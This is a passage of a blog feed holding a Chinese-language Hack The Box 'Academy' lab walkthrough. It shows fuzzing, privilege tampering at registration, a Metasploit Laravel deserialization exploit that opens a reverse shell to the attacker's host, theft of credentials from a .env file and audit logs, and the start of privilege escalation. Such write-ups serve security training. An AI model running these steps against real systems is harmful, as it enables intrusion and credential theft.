    <summary type="html">&lt;h2 id=&quot;0x00-官网描述&quot;&gt;&lt;a href=&quot;#0x00-官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00.官网描述&quot;&gt;&lt;/a&gt;0x00.官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[academy]</title>
    <link href="https://lunamoore.github.io/2020/12/09/HTB-academy/"/>
    <id>https://lunamoore.github.io/2020/12/09/HTB-academy/</id>
    <published>2020-12-09T11:54:07.000Z</published>
    <updated>2020-12-09T12:00:20.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2020/12/09/HTB-academy/image-20201209140730144.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了22、80端口，域名为academy.htb及服务器等信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# nmap -sC -sV -sT 10.10.10.215 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 01:02 EST</span><br><span class="line">Nmap scan report for academy.htb (10.10.10.215)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)</span><br><span class="line">|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)</span><br><span class="line">|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Hack The Box Academy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.43 seconds</span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>首先添加一条hosts [10.10.10.215    academy.htb]，发现一个登入与一个注册框</code></p><img src="/2020/12/09/HTB-academy/image-20201209144619918.png" class><p><code>注册一个账号并登入，手动爬虫，没有什么可用的信息</code></p><img src="/2020/12/09/HTB-academy/image-20201209151326705.png" class><h2 id="0x03-列出目录（403-404）"><a href="#0x03-列出目录（403-404）" class="headerlink" title="0x03.列出目录（403/404）"></a>0x03.列出目录（403/404）</h2><p><code>使用wfuzz进行模糊测试</code></p><blockquote><p>得到以下目录</p><p>config</p><p>admin</p><p>index</p><p>home</p><p>login</p><p>register</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# wfuzz -u http://academy.htb/FUZZ.php -w /usr/share/wordlists/dirb/small.txt --hc 404,403 -t 100</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line">Target: http://academy.htb/FUZZ.php</span><br><span class="line">Total requests: 959</span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line">000000213:   200        0 L      0 W      0 Ch        &quot;config&quot;</span><br><span class="line">000000059:   200        141 L    227 W    2633 Ch     &quot;admin&quot;</span><br><span class="line">000000434:   200        76 L     131 W    2117 Ch     &quot;index&quot;</span><br><span class="line">000000411:   302        1049 L   4114 W   55034 Ch    &quot;home&quot;</span><br><span class="line">000000498:   200        141 L    226 W    2627 Ch     &quot;login&quot; </span><br><span class="line">000000684:   200        148 L    247 W    3003 Ch     &quot;register&quot;                    </span><br><span class="line">Total time: 9.694324</span><br><span class="line">Processed Requests: 959</span><br><span class="line">Filtered Requests: 953</span><br><span class="line">Requests/sec.: 98.92385</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure><h2 id="0x04-查看register目录源码"><a href="#0x04-查看register目录源码" class="headerlink" title="0x04.查看register目录源码"></a>0x04.查看register目录源码</h2><p><code>发现了隐藏域</code></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Ny9hcnRpY2xlL2RldGFpbHMvMTAzNjYwNzQz">隐藏域参考1<i class="fa fa-external-link-alt"></i></span></strong></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHVzaHVpY29uZ3NoZW5nL2FyY2hpdmUvMjAxMS8wNS8wOS8yMDQwOTk0Lmh0bWw=">隐藏域参考2<i class="fa fa-external-link-alt"></i></span></strong></p><img src="/2020/12/09/HTB-academy/image-20201209171550454.png" class><h2 id="0x05-bp抓包"><a href="#0x05-bp抓包" class="headerlink" title="0x05.bp抓包"></a>0x05.bp抓包</h2><p><code>修改roleid的值为1，向后台传值，且用户名后也需要加1；发送，http状态码需要为200</code></p><img src="/2020/12/09/HTB-academy/image-20201209171903646.png" class><h2 id="0x06-访问admin目录"><a href="#0x06-访问admin目录" class="headerlink" title="0x06.访问admin目录"></a>0x06.访问admin目录</h2><h3 id="1-demo1登入"><a href="#1-demo1登入" class="headerlink" title="1.demo1登入"></a>1.demo1登入</h3><img src="/2020/12/09/HTB-academy/image-20201209172159741.png" class><h3 id="2-登入成功"><a href="#2-登入成功" class="headerlink" title="2.登入成功"></a>2.登入成功</h3><p><code>可以看到解决dev-staging-01.academy.htb的问题在推迟中，与两个用户</code></p><blockquote><p>cry0I1t3</p><p>mrb3n</p></blockquote><img src="/2020/12/09/HTB-academy/image-20201209182821986.png" class><h3 id="3-访问dev-staging-01-academy-htb（需添加hosts）"><a href="#3-访问dev-staging-01-academy-htb（需添加hosts）" class="headerlink" title="3.访问dev-staging-01.academy.htb（需添加hosts）"></a>3.访问dev-staging-01.academy.htb（需添加hosts）</h3><p><code>发现服务器敏感信息，应用为Laravel</code></p><img src="/2020/12/09/HTB-academy/image-20201209173106569.png" class><h2 id="0x07-Google搜索Laravel-exp进行利用"><a href="#0x07-Google搜索Laravel-exp进行利用" class="headerlink" title="0x07.Google搜索Laravel exp进行利用"></a>0x07.Google搜索Laravel exp进行利用</h2><p><code>发现可以使用MSF进行利用</code></p><img src="/2020/12/09/HTB-academy/image-20201209173353304.png" class><h2 id="0x08-msf利用"><a href="#0x08-msf利用" class="headerlink" title="0x08.msf利用"></a>0x08.msf利用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# msfconsole -q</span><br><span class="line">msf5 &gt; </span><br><span class="line">msf5 &gt; search Laravel</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution</span><br><span class="line"></span><br><span class="line">msf5 &gt; use 0</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; </span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Path to target webapp</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><h3 id="1-设置本端主机"><a href="#1-设置本端主机" class="headerlink" title="1.设置本端主机"></a>1.设置本端主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.17.216  </span><br></pre></td></tr></table></figure><h3 id="2-设置对端主机"><a href="#2-设置对端主机" class="headerlink" title="2.设置对端主机"></a>2.设置对端主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set rhosts academy.htb</span><br><span class="line">rhosts =&gt; academy.htb</span><br></pre></td></tr></table></figure><h3 id="3-设置app-key"><a href="#3-设置app-key" class="headerlink" title="3.设置app_key"></a>3.设置app_key</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">app_key =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= </span><br></pre></td></tr></table></figure><h3 id="4-设置虚拟主机"><a href="#4-设置虚拟主机" class="headerlink" title="4.设置虚拟主机"></a>4.设置虚拟主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set vhost dev-staging-01.academy.htb</span><br><span class="line">vhost =&gt; dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure><h3 id="5-exploit得到shell"><a href="#5-exploit得到shell" class="headerlink" title="5.exploit得到shell"></a>5.exploit得到shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting                               Required  Description</span><br><span class="line">   ----       ---------------                               --------  -----------</span><br><span class="line">   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     academy.htb                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80                                            yes       The target port (TCP)</span><br><span class="line">   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                                             yes       Path to target webapp</span><br><span class="line">   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[*] Command shell session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.215:39152) at 2020-12-09 03:07:26 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">pwd</span><br><span class="line">/var/www/html/htb-academy-dev-01/public</span><br><span class="line">ls</span><br><span class="line">css</span><br><span class="line">favicon.ico</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">robots.txt</span><br><span class="line">web.config</span><br></pre></td></tr></table></figure><h3 id="6-升级交互shell"><a href="#6-升级交互shell" class="headerlink" title="6.升级交互shell"></a>6.升级交互shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ </span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls</span><br><span class="line">ls</span><br><span class="line">css  favicon.ico  index.php  js  robots.txt  web.config</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ../../</span><br><span class="line">cd ../../</span><br></pre></td></tr></table></figure><h3 id="7-手动爬虫得到了一个口令mySup3rP4s5w0rd"><a href="#7-手动爬虫得到了一个口令mySup3rP4s5w0rd" class="headerlink" title="7.手动爬虫得到了一个口令mySup3rP4s5w0rd!!"></a>7.手动爬虫得到了一个口令<code>mySup3rP4s5w0rd!!</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/var/www$ pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data@academy:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">academy  htb-academy-dev-01  index.php</span><br><span class="line">www-data@academy:/var/www/html$ cd academy</span><br><span class="line">cd academy</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls</span><br><span class="line">ls</span><br><span class="line">app        composer.json  database      public     routes      tests</span><br><span class="line">artisan    composer.lock  package.json  readme.md  server.php  vendor</span><br><span class="line">bootstrap  config         phpunit.xml   resources  storage     webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 280</span><br><span class="line">drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .</span><br><span class="line">drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env</span><br><span class="line">-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example</span><br><span class="line">-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes</span><br><span class="line">-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore</span><br><span class="line">drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app</span><br><span class="line">-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap</span><br><span class="line">-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json</span><br><span class="line">-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database</span><br><span class="line">-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json</span><br><span class="line">-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:13 public</span><br><span class="line">-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes</span><br><span class="line">-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests</span><br><span class="line">drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor</span><br><span class="line">-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ cat .env</span><br><span class="line">cat .env</span><br><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">APP_DEBUG=false</span><br><span class="line">APP_URL=http://localhost</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=academy</span><br><span class="line">DB_USERNAME=dev</span><br><span class="line">DB_PASSWORD=mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line">BROADCAST_DRIVER=log</span><br><span class="line">CACHE_DRIVER=file</span><br><span class="line">SESSION_DRIVER=file</span><br><span class="line">SESSION_LIFETIME=120</span><br><span class="line">QUEUE_DRIVER=sync</span><br><span class="line"></span><br><span class="line">REDIS_HOST=127.0.0.1</span><br><span class="line">REDIS_PASSWORD=null</span><br><span class="line">REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">MAIL_DRIVER=smtp</span><br><span class="line">MAIL_HOST=smtp.mailtrap.io</span><br><span class="line">MAIL_PORT=2525</span><br><span class="line">MAIL_USERNAME=null</span><br><span class="line">MAIL_PASSWORD=null</span><br><span class="line">MAIL_ENCRYPTION=null</span><br><span class="line"></span><br><span class="line">PUSHER_APP_ID=</span><br><span class="line">PUSHER_APP_KEY=</span><br><span class="line">PUSHER_APP_SECRET=</span><br><span class="line">PUSHER_APP_CLUSTER=mt1</span><br><span class="line"></span><br><span class="line">MIX_PUSHER_APP_KEY=&quot;$&#123;PUSHER_APP_KEY&#125;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER=&quot;$&#123;PUSHER_APP_CLUSTER&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="8-经过尝试发现cry0l1t3可以登入"><a href="#8-经过尝试发现cry0l1t3可以登入" class="headerlink" title="8.经过尝试发现cry0l1t3可以登入"></a>8.经过尝试发现<code>cry0l1t3</code>可以登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/var/www/html/academy$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@academy:/home$ ls</span><br><span class="line">ls</span><br><span class="line">21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n</span><br><span class="line">www-data@academy:/home$ su cry0l1t3</span><br><span class="line">su cry0l1t3</span><br><span class="line">Password: mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">/bin/bash</span><br><span class="line">cry0l1t3@academy:/home$ </span><br><span class="line"></span><br><span class="line">cry0l1t3@academy:/home$ cd ~</span><br><span class="line">cd ~</span><br><span class="line">cry0l1t3@academy:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cry0l1t3@academy:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">cry0l1t3@academy:~$ </span><br></pre></td></tr></table></figure><h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><h3 id="1-尝试sudo-l进行提权-霸特没有"><a href="#1-尝试sudo-l进行提权-霸特没有" class="headerlink" title="1.尝试sudo -l进行提权 ,霸特没有"></a>1.尝试sudo -l进行提权 ,霸特没有</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:~$ sudo -l</span><br><span class="line">[sudo] password for cry0l1t3: </span><br><span class="line">Sorry, user cry0l1t3 may not run sudo on academy.</span><br><span class="line">cry0l1t3@academy:~$</span><br></pre></td></tr></table></figure><h3 id="2-对SElinux的日志进行审计"><a href="#2-对SElinux的日志进行审计" class="headerlink" title="2.对SElinux的日志进行审计"></a>2.对SElinux的日志进行审计</h3><p><strong><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmdlbnRvby5vcmcvd2lraS9TRUxpbnV4L1R1dG9yaWFscy9XaGVyZV90b19maW5kX1NFTGludXhfcGVybWlzc2lvbl9kZW5pYWxfZGV0YWlscyM6fjp0ZXh0PVNFTGludXglMjBsb2dnaW5nLC1UaGUlMjBtb3N0JTIwaW1wb3J0YW50JnRleHQ9VGhlJTIwZGVmYXVsdCUyMGxvY2F0aW9uJTIwd2hlcmUlMjB5b3UsJTJGdmFyJTJGbG9nJTJGYXVkaXQu">参考文献<i class="fa fa-external-link-alt"></i></span></strong></p><p><code>可以看到有一个用户进行过su</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ cat * | grep &#x27;comm=&quot;su&quot;&#x27;</span><br><span class="line">type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A</span><br><span class="line">cry0l1t3@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><p><code>解码hex</code></p><blockquote><p>密文：6D7262336E5F41634064336D79210A</p><p>原文：mrb3n_Ac@d3my!</p></blockquote><p><code>根据密码可以推测为mrb3n的密码</code></p><h3 id="3-mrb3n登入"><a href="#3-mrb3n登入" class="headerlink" title="3.mrb3n登入"></a>3.mrb3n登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ su mrb3n</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><p><code>sudo -l提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ sudo -l</span><br><span class="line">[sudo] password for mrb3n:  </span><br><span class="line">Matching Defaults entries for mrb3n on academy:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User mrb3n may run the following commands on academy:</span><br><span class="line">    (ALL) /usr/bin/composer</span><br><span 